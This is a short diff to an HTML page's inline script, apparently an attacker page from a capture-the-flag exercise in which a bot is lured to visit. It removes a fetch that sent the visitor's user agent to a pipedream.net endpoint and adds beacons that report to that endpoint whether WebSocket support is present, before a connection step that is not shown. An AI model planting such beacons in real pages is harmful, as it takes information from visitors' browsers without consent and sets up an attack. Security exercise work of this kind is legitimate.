@@ -8,12 +8,13 @@
 <body>
 
 <script>
-    //way to see if the bot got my link
-    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?nav='+encodeURIComponent(window.navigator.userAgent), {mode: 'no-cors'});
     //websocket available
     window.WebSocket = window.WebSocket || window.MozWebSocket;
     if (!window.WebSocket) {
         fetch('https://eocvkn4m3kpce3q.m.pipedream.net?noWS', {mode: 'no-cors'});
+    }
+    else {
+        fetch('https://eocvkn4m3kpce3q.m.pipedream.net?WS', {mode: 'no-cors'});
     }
 
     //launch connection
